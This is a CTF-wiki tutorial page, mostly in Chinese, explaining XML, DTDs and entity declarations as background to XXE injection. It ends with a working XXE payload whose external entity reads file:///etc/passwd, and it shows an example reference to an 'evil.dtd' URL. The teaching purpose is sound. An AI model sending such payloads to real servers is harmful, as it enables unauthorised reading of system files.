# XXE
!!! warning
    The current page still doesn't have a translation for this language.

    You can read it through google translate.

    Besides, you can also help to translate it: [Contributing](https://ctf-wiki.org/en/contribute/before-contributing/). 



## XML定义

XML:可扩展标记语言，标准通用标记语言的子集，是一种用于标记电子文件使其具有结构性的标记语言。它被设计用来传输和存储数据(而不是储存数据),可扩展标记语言是一种很像超文本标记语言的标记语言。它的设计宗旨是传输数据，而不是显示数据。它的标签没有被预定义。您需要自行定义标签。它被设计为具有自我描述性。它是W3C的推荐标准。

可扩展标记语言(XML)和超文本标记语言(HTML)为不同的目的而设计

它被设计用来传输和存储数据，其焦点是数据的内容。

超文本标记语言被设计用来显示数据，其焦点是数据的外观

XML由3个部分构成，它们分别是：文档类型定义（Document Type Definition，DTD），即XML的布局语言；可扩展的样式语言（Extensible Style Language，XSL），即XML的样式表语言；以及可扩展链接语言（Extensible Link Language，XLL）。

## Xml格式

```
<?xml version="1.0" encoding="UTF-8"?>

<!-- ⬆XML声明⬆ -->

<!DOCTYPE  文件名 [

<!ENTITY实体名 "实体内容">

]>

<!-- ⬆文档类型定义(DTD)⬆ -->

<元素名称 category="属性">

文本或其他元素

</元素名称>

<!-- ⬆文档元素⬆ -->
```

![img](Untitled.assets/1049983-20180712233951266-1391283970.gif)

1，元素
 元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。
 实例:

```
<body>body text in between</body>
<message>some message in between</message>12
```

空的 HTML 元素的例子是 "hr"、"br" 以及 "img"。

2，属性
 属性可提供有关元素的额外信息
 实例：

```
<img src="computer.gif" />1
```

3，实体
 实体是用来定义普通文本的变量。实体引用是对实体的引用。

4，PCDATA
 PCDATA 的意思是被解析的字符数据（parsed character data）。
 PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。

5，CDATA
 CDATA 的意思是字符数据（character data）。
 CDATA 是不会被解析器解析的文本。

## DTD(文档类型定义)

DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。

DTD 可以在 XML 文档内声明，也可以外部引用。

1，内部声明：<!DOCTYPE 根元素 [元素声明]> ex: `<!DOCTYOE test any>`
 完整实例：

```
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to      (#PCDATA)>
  <!ELEMENT from    (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body    (#PCDATA)>
]>
<note>
  <to>George</to>
  <from>John</from>
  <heading>Reminder</heading>
  <body>Don't forget the meeting!</body>
</note>1234567891011121314
```

2，外部声明（引用外部DTD）：<!DOCTYPE 根元素 SYSTEM "文件名"> ex:`<!DOCTYPE test SYSTEM 'http://www.test.com/evil.dtd'>`
 完整实例:

```
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
<to>George</to>
<from>John</from>
<heading>Reminder</heading>
<body>Don't forget the meeting!</body>
</note> 12345678
```

而note.dtd的内容为:

```
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>12345
```

### DTD实体

DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。
 ***
 实体又分为一般实体和参数实体
 1，一般实体的声明语法:<!ENTITY 实体名 "实体内容“>
 引用实体的方式：&实体名；
 2，参数实体只能在DTD中使用，参数实体的声明格式： <!ENTITY % 实体名 "实体内容“>
 引用实体的方式：%实体名；
\*** 

1，内部实体声明:<!ENTITY 实体名称 "实体的值"> ex:`<!ENTITY eviltest "eviltest">`
 完整实例:

```
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY writer "Bill Gates">
<!ENTITY copyright "Copyright W3School.com.cn">
]>
123456
```

<test>&writer;&copyright;</test>

**2，外部实体声明:<!ENTITY 实体名称 SYSTEM "URI">**
 完整实例:

```
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY writer SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
<!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
]>
<author>&writer;&copyright;</author>
```

## xxe

![img](Untitled.assets/1205477-20170729140431597-914383211.png)

![img](Untitled.assets/1205477-20170729140617472-1523498833.png)

![img](Untitled.assets/1205477-20170729141950472-1045381626.png)

![img](Untitled.assets/1205477-20170729142002394-1678808572.png)



```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE nsfocus-sec [  
<!ELEMENT methodname ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<methodcall>
<methodname>&xxe;</methodname>
</methodcall>
```

（这里比较好玩的是Typora甚至会解析<?xml version="1.0" encoding="utf-8"?>）
